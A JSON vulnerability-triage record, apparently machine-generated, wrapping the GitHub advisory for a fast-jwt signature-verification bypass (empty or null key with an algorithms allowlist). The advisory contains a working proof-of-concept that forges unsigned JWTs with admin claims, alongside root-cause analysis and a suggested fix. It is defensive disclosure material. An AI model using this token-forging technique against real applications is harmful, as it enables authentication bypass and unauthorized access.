@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 3, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/191708038?v=4\", \"events_url\": \"https://api.github.com/users/Char0n1507/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Char0n1507/followers\", \"following_url\": \"https://api.github.com/users/Char0n1507/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Char0n1507/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Char0n1507\", \"id\": 191708038, \"login\": \"Char0n1507\", \"node_id\": \"U_kgDOC207hg\", \"organizations_url\": \"https://api.github.com/users/Char0n1507/orgs\", \"received_events_url\": \"https://api.github.com/users/Char0n1507/received_events\", \"repos_url\": \"https://api.github.com/users/Char0n1507/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Char0n1507/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Char0n1507/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Char0n1507\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-107720\", \"cvss\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-20\", \"name\": \"Improper Input Validation\"}, {\"cwe_id\": \"CWE-347\", \"name\": \"Improper Verification of Cryptographic Signature\"}], \"description\": \"### Summary\\n\\n`createVerifier` in fast-jwt ≤ 6.3.0 skips signature verification entirely when the `key` option is a falsy synchronous value (`''` or `null`) **and** the `algorithms` option is set to a non-empty allowlist. An attacker who can present a JWT to the application — regardless of algorithm — can forge arbitrary claims without possessing any signing key.\\n\\n### Details\\n\\n**Root cause — four cooperating code paths:**\\n\\n**A. Falsy sync keys bypass `prepareKeyOrSecret`**\\n\\n`createVerifier` branches on `typeof key`:\\n\\n```js\\nconst keyType = typeof key\\nif (keyType !== 'string' && keyType !== 'object' && keyType !== 'function') {\\n  throw new TokenError(/* ... */)\\n}\\nif (key && keyType !== 'function') {\\n  key = prepareKeyOrSecret(key, hsAlgorithms.includes(availableAlgorithms[0]))\\n}\\n```\\n\\nWhen `key` is `''` (string, falsy) or `null` (object, falsy) the outer type check passes but the `if (key && ...)` guard never calls `prepareKeyOrSecret`. The empty-secret rejection added in that function is therefore never reached for sync keys:\\n\\n```js\\nfunction prepareKeyOrSecret(key, isSecret) {\\n  if (isSecret && key.length === 0) {\\n    throw new TokenError(TokenError.codes.invalidKey, 'The key cannot be an empty string or buffer.')\\n  }\\n  return isSecret ? createSecretKey(key) : createPublicKey(key)\\n}\\n```\\n\\n**B. Explicit `algorithms` keeps an allowlist active with no key**\\n\\nWhen `key` is falsy, autodetection is skipped and the caller-supplied `algorithms` (e.g. `['HS256']`) is retained in `allowedAlgorithms`. The verifier therefore accepts tokens whose header matches that list.\\n\\n**C. `hasKey` is false → missing signature is permitted**\\n\\n```js\\nconst hasKey = key instanceof Buffer ? key.length : !!key\\n\\nif (hasKey && !signature) {\\n  throw new TokenError(/* missingSignature */)\\n} else if (!hasKey && signature) {\\n  throw new TokenError(/* missingKey */)\\n}\\n// !hasKey && !signature → fall through with NO crypto\\n```\\n\\nAn unsigned token (`header.payload.`) produces `signature === ''`, which is falsy, so both branches are skipped.\\n\\n**D. Signature check is gated on `signature` being truthy**\\n\\n```js\\nif (signature && !verifySignature(header.alg, key, input, signature)) {\\n  throw new TokenError(/* invalidSignature */)\\n}\\n```\\n\\nEmpty signature → condition is `false` → `verifySignature` is never called.\\n\\n**E. Signer / verifier asymmetry**\\n\\n- `createSigner({ key: '' })` / `key: null` → **rejected**\\n- `createVerifier({ key: async () => '' })` → **rejected** (GHSA empty-secret tests)\\n- `createVerifier({ key: '' | null, algorithms: [...] })` → **accepted**, then verifies unsigned tokens\\n\\nIronically, the security best practice of setting `algorithms` **enables** the bypass. With `algorithms` omitted, `allowedAlgorithms` stays `[]` and every token fails closed.\\n\\n**Affected versions:** confirmed on 6.3.0 (current `main` @ 378422c).\\nThis is an incomplete fix relative to the empty-secret hardening already applied for `Buffer` keys and `async` key functions (GHSA-gmvf lineage, PR #609).\\n\\n### PoC\\n\\n```bash\\ncd /tmp && git clone --depth 1 https://github.com/nearform/fast-jwt.git && cd fast-jwt && npm install\\n```\\n\\n```js\\n// poc-empty-key-bypass.js\\nconst { createVerifier } = require('.')\\n\\nfunction unsigned(alg, claims) {\\n  const h = Buffer.from(JSON.stringify({ alg, typ: 'JWT' })).toString('base64url')\\n  const p = Buffer.from(JSON.stringify(claims)).toString('base64url')\\n  return `${h}.${p}.`  // trailing dot = empty signature\\n}\\n\\nconst token = unsigned('HS256', { sub: 'attacker', admin: true, role: 'root' })\\n\\n// Vulnerable: key '' + explicit algorithms allowlist\\nconst verify = createVerifier({ key: '', algorithms: ['HS256'] })\\nconsole.log(verify(token))\\n// → { sub: 'attacker', admin: true, role: 'root' }\\n\\n// Also works for RS256 / ES256 / EdDSA allowlists and key: null\\nconsole.log(createVerifier({ key: null, algorithms: ['RS256'] })(unsigned('RS256', { admin: true })))\\n// → { admin: true }\\n\\n// Negative controls (correctly rejected):\\ntry { createVerifier({ key: 'secret', algorithms: ['HS256'] })(token) }\\n  catch (e) { console.log('non-empty key:', e.code) }   // FAST_JWT_MISSING_SIGNATURE\\n\\ntry { createVerifier({ key: '' })(token) }\\n  catch (e) { console.log('empty key, no algorithms:', e.code) }  // FAST_JWT_INVALID_ALGORITHM\\n\\ntry { createVerifier({ key: Buffer.alloc(0), algorithms: ['HS256'] })(token) }\\n  catch (e) { console.log('empty Buffer:', e.code) }   // FAST_JWT_INVALID_KEY\\n```\\n\\n**Expected:** `TokenError` with code `FAST_JWT_INVALID_KEY`\\n**Actual:** payload returned with no signature check\\n\\n### Impact\\n\\nFull authentication / authorization bypass. Any application that:\\n\\n1. Uses `createVerifier` with `key: ''` or `key: null` (common when a secret is read from an unset environment variable, e.g. `process.env.JWT_SECRET || ''`), **and**\\n2. Sets `algorithms` to a non-empty allowlist (a recommended security practice),\\n\\nwill accept attacker-crafted JWTs with arbitrary claims. Claim checks (`exp`, `allowedSub`, etc.) still run; only signature verification is skipped.\\n\\n### Suggested fix\\n\\nIn `createVerifier`, fail closed before binding the verifier:\\n\\n```js\\nif (keyType !== 'function') {\\n  if (key === null || key === '' || (Buffer.isBuffer(key) && key.length === 0)) {\\n    throw new TokenError(TokenError.codes.invalidKey,\\n      'The key cannot be null, empty, or a zero-length buffer.')\\n  }\\n}\\n```\\n\\nAlso guard the combination explicitly:\\n\\n```js\\nif (!key && allowedAlgorithms.length > 0) {\\n  throw new TokenError(TokenError.codes.invalidKey,\\n    'The key cannot be falsy when algorithms is set.')\\n}\\n```\\n\\nThe async path (key function resolving to `''`) is already hardened via `prepareKeyOrSecret` and does not need to change.\", \"ghsa_id\": \"GHSA-8wpc-h4q6-8fxv\", \"github_reviewed_at\": \"2026-10-08T22:02:12Z\", \"html_url\": \"https://github.com/advisories/GHSA-8wpc-h4q6-8fxv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8wpc-h4q6-8fxv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-107720\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-08T22:02:12Z\", \"references\": [\"https://github.com/nearform/fast-jwt/security/advisories/GHSA-8wpc-h4q6-8fxv\", \"https://github.com/nearform/fast-jwt/pull/649\", \"https://github.com/nearform/fast-jwt/commit/e22a151e83bf6d5e54e281216982d204d5665534\", \"https://github.com/nearform/fast-jwt/releases/tag/v6.3.1\", \"https://github.com/advisories/GHSA-8wpc-h4q6-8fxv\"], \"repository_advisory_url\": \"https://api.github.com/repos/nearform/fast-jwt/security-advisories/GHSA-8wpc-h4q6-8fxv\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nearform/fast-jwt\", \"summary\": \"fast-jwt: createVerifier accepts unsigned JWTs when key is '' or null and algorithms is explicitly set\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-08T22:02:13Z\", \"url\": \"https://api.github.com/advisories/GHSA-8wpc-h4q6-8fxv\", \"vulnerabilities\": [{\"first_patched_version\": \"6.3.1\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"fast-jwt\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 6.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8wpc-h4q6-8fxv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "fast-jwt: <= 6.3.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-107720"
+    ],
+    "cvss_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "fast-jwt"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-09T19:14:15.344345Z",
+  "provenance": {
+    "content_sha256": "2664624d0f42371cabe7faf41aa93e6e9ad8f9ba2584ab8f0954d02488eb0e0d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-08T22:02:12Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8wpc-h4q6-8fxv",
+  "status": "active",
+  "title": "fast-jwt: createVerifier accepts unsigned JWTs when key is '' or null and algorithms is explicitly set",
+  "updated_at": "2026-10-08T22:02:13Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8wpc-h4q6-8fxv"
+}
